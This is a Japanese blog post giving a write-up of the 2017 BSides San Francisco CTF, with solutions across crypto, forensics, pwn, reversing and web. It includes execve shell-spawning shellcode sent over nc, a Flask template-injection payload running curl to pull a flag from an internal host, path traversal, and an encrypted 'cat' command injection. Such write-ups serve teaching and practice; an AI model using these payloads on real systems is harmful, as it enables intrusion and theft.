---
layout: post
title: BSides San Francisco CTF の write-up
categories: [ctf]
date: 2017-02-14 18:30:00 +0900
---

チーム Harekaze で [BSides San Francisco CTF](https://bsidessf.com/ctf.html) に参加しました。

最終的にチームで 3837 点を獲得し、順位は 18 位 (得点 531 チーム中) でした。うち、私は 20 問を解いて 2384 点を入れました。

以下、解いた問題の write-up です。

## [Crypto 250] []root

渡された pcapng ファイルを開いてみると、どうやら SSL/TLS で通信をしているようで内容を見ることができません。適当に pcap に変換して NetworkMiner に投げると、証明書を簡単に取り出すことができました。

`openssl x509 -inform der -noout -text -in pki@e-corp.com.cer` で Modulus を取り出し、Fermat 法で素因数分解をしてみると無事成功しました。

[ius/rsatool](https://github.com/ius/rsatool) を使って `rsatool.py -f PEM -o e-corp.pem -p ... -q ... -e 31337` で秘密鍵を作り、Wireshark に投げると通信が復号できました。

```
when_solving_problems_dig_at_the_roots_instead_of_just_hacking_at_the_leaves
```

## [Crypto 100] in-plain-sight

鍵でググると [Going the other way with padding oracles: Encrypting arbitrary data! » SkullSecurity](https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data) という記事がヒットします。

```python
from Crypto.Cipher import AES
key = 'c086e08ad8ee0ebe7c2320099cfec9eea9a346a108570a4f6494cfe7c2a30ee1'.decode('hex')
iv = '0a0e176722a95a623f47fa17f02cc16a'.decode('hex')
aes = AES.new(key, AES.MODE_CBC, iv)
print aes.decrypt('HiddenCiphertext')
```

```
FLAG:1d010f248d
```

## [Forensics 500] dnscap

[@neglect_yp](https://twitter.com/neglect_yp) さん、[@megumish](https://twitter.com/megumish) さんがいろいろ試されて、[dnscat2/protocol.md at master · iagox86/dnscat2](https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md) というドキュメントを見つけていました。

```python
from scapy.all import *
pcap = rdpcap('dnscap.pcap')
res = ''
s = set()
for p in pcap:
  buf = None
  if DNSQR in p:
    buf = p[DNSQR].qname
  if buf is None:
    continue
  buf = buf.replace('skullseclabs.org', '')
  buf = buf.replace('.', '')
  buf = buf[18:]
  if buf in s:
    continue
  s.add(buf)
  res += buf
open('result.bin', 'wb').write(res.decode('hex'))
```

でフラグが出てきました。

```
FLAG:b91011fc
```

## [Misc 1] Ancient Hop Grain Juice

ホップと穀物でできた飲み物は何か。

```
beer
```

## [Misc 20] NOP

x86 の NOP は何と等価か。

```
xchg eax, eax
```

## [Misc 1] The Wrong Cipher

WEP で誤った使われ方をしていた暗号は何か。

```
RC4
```

## [Misc 1] The Right Cipher

TKIP で正しく使われていた暗号は何か。

```
RC4
```

## [Misc 1] Quote

`My voice is my passport` でググると出ます。

```
Sneakers
```

## [Misc 10] Way Before Nirvana

Ascii85。

```
thatwaseasy
```

## [Pwn 200] i-am-the-shortest

任意の命令列を実行させることができますが、たった 5 バイトしか送れません。

eax に 5、ebx に 1、esi にフラグが入っているアドレス、edx に 0xff が入っています。少しいじって `write(1, esi, 0xff)` を呼びましょう。

```
$ asm "dec eax; mov ecx, esi; int 0x80;" | nc i-am-the-shortest-6d15ba72.ctf.bsidessf.net  8890
The address of 'flag' is 0xffdb138c
Send your machine code now! Max length = 5 bytes.

FLAG:c9f053110aa0f2d28ed8978e3b03cb01
...
```

```
FLAG:c9f053110aa0f2d28ed8978e3b03cb01
```

## [Pwn 100] hashecute

`(md5(code)) + (code)` を送るとそのまま実行してくれるようです。が、`md5(code)` ごと実行されてしまいます。

最初に `code` まで飛ばしてしまいましょう。

```python
import hashlib
import sys
shellcode = 'jhH\xb8/bin///sPH\x89\xe71\xf6j;X\x99\x0f\x05'
i = 0
while True:
  s = shellcode + str(i)
  h = hashlib.md5(s)
  if h.hexdigest().startswith('eb0e'):
    sys.stdout.write(h.digest() + s)
    break
  i += 1
```

```
$ (python s.py; cat) | nc hashecute-9b16b5b9.ctf.bsidessf.net 2525
Send me stuff!!
cat /home/ctf/flag.txt
FLAG:74b931a6a99f8c7a65a53fb5bc1afe16
```

```
FLAG:74b931a6a99f8c7a65a53fb5bc1afe16
```

## [Pwn 30] easyshell64

送ったものをそのまま実行してくれます。めんどくさいのでさっきのコードをそのまま使いましょう。

```
$ (python s.py; cat) | nc easyshell64-efb598a6.ctf.bsidessf.net 5253
Send me stuff!! We're 64 bits!
cat /home/ctf/flag.txt
FLAG:e8864c381822ec7cf97f5516745411f5
```

```
FLAG:e8864c381822ec7cf97f5516745411f5
```

## [Reversing 100] Easyarm

[Retargetable Decompiler](https://retdec.com/) にバイナリを投げると、

```c
...
    if (*(char *)(*v2 + 18) == 0 || *(char *)(*v2 + 18) != 97) {
        ...
    }

    if (*(char *)(*v2 + 15) == 0 || *(char *)(*v2 + 15) != 95) {
        ...
    }
...
```

という感じで延々続く部分がありました。`!=` で grep して加工するとフラグが出てきました。

```
Flag:ARM_Is_Not_Scary
```

## [Reversing 200] Skipper2

いろいろ環境のチェックをして、全部 OK ならフラグが表示されるというバイナリです。文字列の比較には `strcmp` を使っているようなので、置き換えてしまいましょう。

```c
int strcmp(char *s1, char *s2) {
  int i;
  for (i = 0; s2[i]; i++) {
    s1[i] = s2[i];
  }
  s1[i] = '\0';
  return 0;
}
```

```
$ gcc -shared -fPIC -o a.so a.c
$ LD_PRELOAD=./a.so ./skipper2-32
Computer name: kali-i386
OS version: 4.0.0
GenuineIntel


The key is: FLAG:18ee7c71d2794f546ca23e6858de0bc6
```

```
FLAG:18ee7c71d2794f546ca23e6858de0bc6
```

## [Reversing 150] Pinlock

与えられた apk ファイルを展開すると、`assets/pinlock.db` というファイルがありました。まずこの DB の内容を調べましょう。

```
sqlite> select sql from sqlite_master;
CREATE TABLE `android_metadata` (
        `locale`        TEXT DEFAULT 'en_US'
)
CREATE TABLE `pinDB` (
        `_id`   INTEGER,
        `pin`   TEXT,
        PRIMARY KEY(`_id`)
)
CREATE TABLE `secretsDBv1` (
        `_id`   INTEGER,
        `entry` TEXT,
        PRIMARY KEY(`_id`)
)
CREATE TABLE `secretsDBv2` (
        `__id`  INTEGER,
        `entry` TEXT,
        PRIMARY KEY(`__id`)
)
sqlite> select * from pinDB;
1|d8531a519b3d4dfebece0259f90b466a23efc57b
sqlite> select * from secretsDBv1;
1|hcsvUnln5jMdw3GeI4o/txB5vaEf1PFAnKQ3kPsRW2o5rR0a1JE54d0BLkzXPtqB
sqlite> select * from secretsDBv2;
1|Bi528nDlNBcX9BcCC+ZqGQo1Oz01+GOWSmvxRj7jg1g=
```

d8531a519b3d4dfebece0259f90b466a23efc57b でググると、これは 7498 の sha1 ハッシュということが分かります。

classes.dex を展開してデコンパイルすると、使われていないソルトがあること、secretsDBv2 はどこからも参照されていないことが分かります。

あとは手に入れた PIN コード、使われていないソルト、secretsDBv2 の暗号文を使って復号するだけです。

```python
import hashlib
from Crypto.Cipher import AES

pin = '7498'
encrypted = 'Bi528nDlNBcX9BcCC+ZqGQo1Oz01+GOWSmvxRj7jg1g='.decode('base64')
salt = 'SampleSalt'

key = hashlib.pbkdf2_hmac('sha1', pin, salt, 1000, 16)
cipher = AES.new(key, AES.MODE_ECB)
print repr(cipher.decrypt(encrypted))
```

```
﻿⁠⁠⁠⁠Flag:OnlyAsStrongAsWeakestLink
```

## [Web 20] Zumbo 1

私が問題をチェックした時点で [@hiww](https://twitter.com/hiww) さんがソースを見つけていました。

ソース内にある `FLAG: FIRST_FLAG_WASNT_HARD` を投げると正解でした。

```
FLAG: FIRST_FLAG_WASNT_HARD
```

## [Web 100] Zumbo 2

```python
@app.route('/<path:page>')
def custom_page(page):
    if page == 'favicon.ico': return ''
    global counter
    counter += 1
    try:
        template = open(page).read()
    except Exception as e:
        template = str(e)
    template += "\n<!-- page: %s, src: %s -->\n" % (page, __file__)
    return flask.render_template_string(template, name='test', counter=counter);
```

とあります。~~`curl http://zumbo-8ac445b1.ctf.bsidessf.net/%2fflag`~~ `curl http://zumbo-8ac445b1.ctf.bsidessf.net/..%2fflag` でフラグが出てきました。

```
FLAG: RUNNER_ON_SECOND_BASE
```

## [Web 250] Zumbo 3

さきほどのコードを見ると、エラーメッセージをそのまま `flask.render_template_string` に投げています。テンプレートのインジェクションができそうです。

過去問を探していると [A python's escape from PlaidCTF jail · @wapiflapi](http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/) という記事を見つけました。これをもとに

```
http://zumbo-8ac445b1.ctf.bsidessf.net/%7b%7b ().__class__.__base__.__subclasses__()[59]().__repr__.im_func.func_globals['linecache'].os.popen('curl http://vault:8080/flag').read() %7d%7d
```

でフラグが出てきました。

```
FLAG: BRICK_HOUSE_BEATS_THE_WOLF
```

## [Web 100] the-year-2000

```
I made this website all by myself using these tools
- html
- notepad++
- git
- apache
```

ということなので `http://theyear2000.ctf.bsidessf.net/.git/logs/HEAD` にアクセスすると

```
0000000000000000000000000000000000000000 e039a6684f53e818926d3f62efd25217b25fc97e Mark Zuckerberg <thezuck@therealzuck.zuck> 1486853661 +0000	commit (initial): First commit on my website
e039a6684f53e818926d3f62efd25217b25fc97e 9e9ce4da43d0d2dc10ece64f75ec9cab1f4e5de0 Mark Zuckerberg <thezuck@therealzuck.zuck> 1486853667 +0000	commit: Fixed a spelling error
9e9ce4da43d0d2dc10ece64f75ec9cab1f4e5de0 e039a6684f53e818926d3f62efd25217b25fc97e Mark Zuckerberg <thezuck@therealzuck.zuck> 1486853668 +0000	reset: moving to HEAD~1
e039a6684f53e818926d3f62efd25217b25fc97e 4eec6b9c6e464c35fff1efb8444dd0ac1ae67b30 Mark Zuckerberg <thezuck@therealzuck.zuck> 1486853672 +0000	commit: Wooops, didn't want to commit that. Rebased.
```

と出てきました。

`http://theyear2000.ctf.bsidessf.net/.git/objects/9e/9ce4da43d0d2dc10ece64f75ec9cab1f4e5de0` を取ってきて `zlib.decompress` すると `tree bd72ee2c7c5adb017076fd47a92858cef2a04c11` と出てきました。

さらに `http://theyear2000.ctf.bsidessf.net/.git/objects/bd/72ee2c7c5adb017076fd47a92858cef2a04c11` を取ってきて `zlib.decompress` すると後ろに `7baff32394e517c44f35b75079a9496559c88053` というハッシュが出てきました。

最後に `http://theyear2000.ctf.bsidessf.net/.git/objects/7b/aff32394e517c44f35b75079a9496559c88053` を取ってきて `zlib.decompress` するとフラグが表示されました。

```
FLAG:what_is_HEAD_may_never_die
```

## [Web 250] delphi-status

```python
import requests

def pad(s):
  l = 16 - len(s)
  return s + chr(l) * l

def xor(s, t):
  res = ''
  for a, b in zip(s, t):
    res += chr(ord(a) ^ ord(b))
  return res

k = '04fd99529a313748699280542b897817'.decode('hex')
z = '00000000000000000000000000000000'

p = xor(k, pad('cat f*.txt')).encode('hex') + z
print requests.get('http://delphi-status-e606c556.ctf.bsidessf.net/execute/' + p).content
```

これでフラグが出てきました。よく分かっていません…。

```
FLAG:a1cf81c5e0872a7e0a4aec2e8e9f74c3
```

## 感想

Web 全完です。やったー。
